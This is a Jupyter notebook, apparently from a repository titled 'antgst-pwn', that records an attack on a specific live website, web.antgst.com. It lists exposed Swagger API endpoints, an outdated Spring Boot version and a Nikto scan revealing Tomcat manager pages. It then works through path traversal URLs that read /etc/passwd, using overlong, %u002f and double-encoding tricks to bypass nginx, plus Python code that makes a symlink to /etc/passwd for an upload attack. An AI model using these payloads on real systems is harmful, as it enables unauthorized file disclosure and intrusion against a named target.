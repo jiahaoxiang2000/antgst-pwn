{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## component issue\n",
    "\n",
    "### swagger api not close\n",
    "\n",
    "http://web.antgst.com/antgst/v2/api-docs\n",
    "\n",
    "http://web.antgst.com/antgst/online/cgform/api/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "plaintext"
    }
   },
   "source": [
    "## spring boot issue \n",
    "\n",
    "```xml\n",
    "   <groupId>org.springframework.boot</groupId>\n",
    "\t    <artifactId>spring-boot-starter-parent</artifactId>\n",
    "\t    <version>2.3.5.RELEASE</version>\n",
    "\t    <relativePath/>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Nikto v2.5.0\n",
    "---------------------------------------------------------------------------\n",
    "+ Target IP:          198.18.0.246\n",
    "+ Target Hostname:    web.antgst.com\n",
    "+ Target Port:        80\n",
    "+ Start Time:         2024-11-25 16:42:17 (GMT8)\n",
    "---------------------------------------------------------------------------\n",
    "+ Server: nginx/1.20.2\n",
    "s+ No CGI Directories found (use '-C all' to force check all possible dirs)\n",
    "+ /antgst/favicon.ico: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n",
    "+ /antgst/: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy\n",
    "+ /antgst/: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy\n",
    "+ /antgst/: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\n",
    "+ /antgst/: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security\n",
    "+ /antgst/: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options\n",
    "+ /antgst: Retrieved access-control-allow-origin header: nikto.example.com.\n",
    "+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS .\n",
    "+ /antgst/examples/servlets/index.html: Apache Tomcat default JSP pages present.\n",
    "+ /antgst/examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104\n",
    "+ No creds found for realm 'Tomcat Manager Application'\n",
    "+ /antgst/manager/html: Default Tomcat Manager / Host Manager interface found.\n",
    "+ No creds found for realm 'Tomcat Host Manager Application'\n",
    "+ /antgst/host-manager/html: Default Tomcat Manager / Host Manager interface found.\n",
    "+ /antgst/manager/html: Tomcat Manager / Host Manager interface found (pass protected).\n",
    "+ /antgst/host-manager/html: Tomcat Manager / Host Manager interface found (pass protected).\n",
    "+ /antgst/manager/status: Default Tomcat Server Status interface found.\n",
    "+ /antgst/manager/status: Tomcat Server Status interface found (pass protected).\n",
    "+ 8358 requests: 0 error(s) and 16 item(s) reported on remote host\n",
    "+ End Time:           2024-11-25 16:57:00 (GMT8) (883 seconds)\n",
    "---------------------------------------------------------------------------\n",
    "+ 1 host(s) tested"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "ase URLs:\n",
    "\n",
    "* <a href=\"https://web.antgst.com/antgst\">正式环境: https://web.antgst.com/antgst</a>\n",
    "\n",
    "<a id=\"opIduploadUsingPOST\"></a>\n",
    "\n",
    "\n",
    "POST /sys/common/upload\n",
    "\n",
    "\n",
    "> Response Examples\n",
    "\n",
    "> form-data biz is the file path, the final storage file will add the currentTimeMillis\n",
    "\n",
    "biz:/temp\n",
    "file:file://**/11.png\n",
    "\n",
    "> note : use the ../ to go to the parent directory"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "/files/{date}/{filename}\n",
    "\n",
    "https://web.antgst.com/antgst/files/20241125/../../../../../../../etc/passwd\n",
    "\n",
    "https://web.antgst.com/antgst/files/20241125/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n",
    "\n",
    "replace the / to %2f not work, nginx/1.20.2 , 400 bad request\n",
    "\n",
    "https://web.antgst.com/antgst/files/20241125/%00%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n",
    "\n",
    "Overlong Encoding %c0%af replace %2f pass nginx not pass the java\n",
    "\n",
    "https://web.antgst.com/antgst/files/20241125/%2e%2e%C0%AF%2e%2e%C0%AF%2e%2e%C0%AF%2e%2e%C0%AF%2e%2e%C0%AF%2e%2e%C0%AF%2e%2e%C0%AFetc%C0%AFpasswd\n",
    "\n",
    "use the %u002f to bypass the nginx 400 bad request\n",
    "\n",
    "https://web.antgst.com/antgst/files/20241125/%u002e%u002e%u002F%u002e%u002e%u002F%u002e%u002e%u002F%u002e%u002e%u002F%u002e%u002e%u002F%u002e%u002e%u002F%u002e%u002e%u002Fetc%u002Fpasswd\n",
    "\n",
    "Double Encoding %252e%252e%252f replace %2e%2e%2f is can pass the nginx 400 bad request\n",
    "\n",
    "https://web.antgst.com/antgst/files/20241125/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd\n",
    "\n",
    "the %2e is URL-encoded can work, \n",
    "\n",
    "https://web.antgst.com/antgst/files/20241125/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Symbolic link evil.txt -> /etc/passwd created successfully.\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "# Define the target file and the symbolic link name\n",
    "target_file = \"/etc/passwd\"\n",
    "link_name = \"evil.txt\"\n",
    "\n",
    "# Create the symbolic link\n",
    "try:\n",
    "    os.symlink(target_file, link_name)\n",
    "    print(f\"Symbolic link {link_name} -> {target_file} created successfully.\")\n",
    "except OSError as e:\n",
    "    print(f\"Error: {e}\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "pwn",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.20"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
